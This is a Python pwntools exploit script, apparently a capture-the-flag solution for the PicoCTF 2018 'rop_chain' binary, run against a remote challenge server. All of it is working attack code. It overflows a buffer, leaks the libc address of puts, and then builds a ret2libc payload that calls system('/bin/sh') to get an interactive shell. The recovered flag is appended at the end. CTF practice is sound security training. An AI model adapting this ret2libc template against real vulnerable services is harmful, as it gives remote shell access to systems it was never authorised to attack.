from pwn import *
from LibcSearcher import *
p = remote('node4.buuoj.cn',26558)
libc = ELF("libc-2.27.so")
context.log_level="debug"
elf=ELF("PicoCTF_2018_rop_chain")
puts_plt=elf.plt["puts"]
puts_got=elf.got["puts"]
main_addr=elf.sym["main"]
payload=(28)*b'a'+p32(puts_plt)+p32(main_addr)+p32(puts_got)
p.sendlineafter(">",payload)
puts_addr = u32(p.recvuntil('\xf7')[-4:])

libc_base=puts_addr-libc.sym['puts']
system=libc_base+libc.sym['system']
sh=libc_base+next(libc.search(b'/bin/sh'))
payload_=28*b'a'+p32(system)+p32(main_addr)+p32(sh)
p.sendlineafter(">",payload_)
p.interactive()

#flag{b7e8ef0b-23df-4c87-bb7e-e0dfde03831a}


